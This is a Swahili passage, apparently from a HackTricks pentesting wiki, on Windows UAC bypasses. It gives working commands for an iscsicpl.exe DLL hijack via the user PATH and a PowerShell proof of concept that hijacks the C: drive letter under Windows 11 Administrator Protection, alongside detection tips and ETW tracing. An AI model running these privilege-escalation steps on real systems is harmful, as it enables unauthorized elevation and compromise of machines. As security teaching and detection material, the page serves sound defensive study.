   1. **wusa.exe**: Windows 7, 8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu tool hii inaendeshwa katika kiwango cha juu cha integrity).
   2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya njia iliyolindwa na kutekeleza binary iliyo hatarini na inayofanya autoelevate.

### Mbinu nyingine ya UAC bypass

Inahusisha kuchunguza ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka kwenye **registry** **jina/njia** ya **binary** au **command** itakayo**tekelezwa** (hili linavutia zaidi ikiwa binary inatafuta taarifa hiyo ndani ya **HKCU**).

### UAC bypass kupitia `SysWOW64\iscsicpl.exe` + DLL hijack ya user `PATH`

`C:\Windows\SysWOW64\iscsicpl.exe` ya 32-bit ni binary inayofanya **auto-elevated** ambayo inaweza kutumiwa vibaya kupakia `iscsiexe.dll` kulingana na mpangilio wa utafutaji. Ikiwa unaweza kuweka `iscsiexe.dll` hasidi ndani ya folda inayoweza kuandikwa na **mtumiaji**, kisha kurekebisha `PATH` ya mtumiaji wa sasa (kwa mfano kupitia `HKCU\Environment\Path`) ili folda hiyo itafutwe, Windows inaweza kupakia DLL ya mshambuliaji ndani ya mchakato wa `iscsicpl.exe` ulioinuliwa **bila kuonyesha kidokezo cha UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Vidokezo vya vitendo:
- Hii ni muhimu ikiwa mtumiaji wa sasa yuko kwenye **Administrators** lakini anaendesha katika **Medium Integrity** kwa sababu ya UAC.
- Nakala ya **SysWOW64** ndiyo inayohusika na bypass hii. Ichukulie nakala ya **System32** kama binary tofauti na uthibitishe tabia yake kivyake.
- Mbinu hii inachanganya **auto-elevation** na **DLL search-order hijacking**, kwa hiyo workflow ileile ya ProcMon inayotumika kwa UAC bypass nyingine inafaa kuthibitisha upakiaji wa DLL inayokosekana.

Mtiririko wa chini kabisa:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Mawazo ya utambuzi:
- Toa tahadhari `reg add` / uandishi wa registry kwenye `HKCU\Environment\Path` unapofuatwa mara moja na utekelezaji wa `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tafuta `iscsiexe.dll` katika maeneo **yanayodhibitiwa na mtumiaji** kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Linganisha uzinduzi wa `iscsicpl.exe` na michakato tegemezi isiyotarajiwa au upakiaji wa DLL kutoka nje ya saraka za kawaida za Windows.

### Utafiti mpya zaidi unaofaa kuchunguzwa kando

Baadhi ya minyororo iliyochapishwa baada ya 2024 haifanani tena na utekaji nyara wa kawaida wa registry ya `HKCU\Software\Classes`. Kwa mfano, sumu ya akiba ya muktadha wa uanzishaji inaweza kuunganisha **drive remap** na **DLL redirection** ili kupanda kutoka uadilifu wa kati hadi wa juu kupitia UI inayoaminika / binaries zinazopandishwa kiotomatiki kama `ctfmon.exe` na malengo ya baadaye kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia mifano fupi ya payload katika:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Utekaji nyara wa herufi ya diski kwenye Administrator Protection (preview) kupitia ramani ya kifaa cha DOS kwa kila kipindi cha kuingia

> [!NOTE]
> Kufikia Agosti 2026, Microsoft bado inaeleza Administrator Protection kama **Insider preview**: utoaji wa Oktoba 2025 ulirejeshwa nyuma na umepangwa kwa tarehe ya baadaye. Thibitisha kuwa **Admin Approval Mode with Administrator protection** imewashwa kweli na kifaa kimewashwa upya kabla ya kujaribu minyororo hii; mfuatano wa toleo la kawaida la 25H2 pekee hauthibitishi kuwa kipengele hiki kinafanya kazi.<sup>[[10]](#references)</sup>

Kwa maelezo kamili ya eneo la mashambulizi la `RAiLaunchAdminProcess` / UIAccess kwenye matoleo ya preview ya Windows 11 25H2, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia tokeni za shadow-admin zenye ramani za `\Sessions\0\DosDevices/<LUID>` kwa kila kipindi. Saraka huundwa tu inapohitajika na `SeGetTokenDeviceMap` wakati wa utatuzi wa kwanza wa `\??`. Ikiwa mshambuliaji ataiga tokeni ya shadow-admin katika kiwango cha **SecurityIdentification** pekee, saraka huundwa huku mshambuliaji akiwa **mmiliki** (hurithi `CREATOR OWNER`), na hivyo kuwezesha viungo vya herufi za diski vinavyotangulizwa kuliko `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Hatua:**

1. Kutoka kwenye kipindi chenye mapendeleo ya chini, ita `RAiProcessRunOnce` ili kuanzisha `runonce.exe` ya shadow-admin bila kidokezo.
2. Nakili tokeni yake ya msingi kuwa tokeni ya **identification** na uiige unapofungua `\??` ili kulazimisha uundaji wa `\Sessions\0\DosDevices/<LUID>` chini ya umiliki wa mshambuliaji.
3. Unda symlink ya `C:` hapo inayoelekeza kwenye hifadhi inayodhibitiwa na mshambuliaji; ufikiaji unaofuata wa mfumo wa faili katika kipindi hicho utatatua `C:` kuwa njia ya mshambuliaji, na hivyo kuwezesha utekaji nyara wa DLL/faili bila kidokezo.

**PoC ya PowerShell (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Kwenye hosts za preview, Administrator Protection huhifadhi idhini na kushindwa kama matukio ya ETW **15031** na **15032** chini ya provider ya `Microsoft-Windows-LUA`. Matukio hayo yanajumuisha SID ya mwombaji, njia ya programu, matokeo, akaunti ya msimamizi inayosimamiwa, na mbinu ya uthibitishaji, kwa hivyo majaribio ya mara kwa mara ya exploit au kushindwa kuendesha UI hayaachwi bila telemetry.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Mkusanyiko wa mbinu za UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kichanganuzi cha uoanifu wa UAC bypass na kizindua](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Hutumia AI Kuzalisha PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Unyonyaji wa 0-Day dhidi ya Malengo ya Serikali za Asia ya Kusini-Mashariki](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC kwa kutumia kazi ya SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Bypasses za UnifiedConsent, TabTip na Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Ulinzi wa msimamizi](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Kupiga simu kwa seva za Windows RPC za ndani kutoka .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte Inaboresha CoolClient kwa Rootkit ya Windows Kernel Iliyosainiwa](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Trojan ya Windows Isiyotambulika Kabisa Iliyoundwa kwa Ujasusi, Wizi na Ugaidi](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
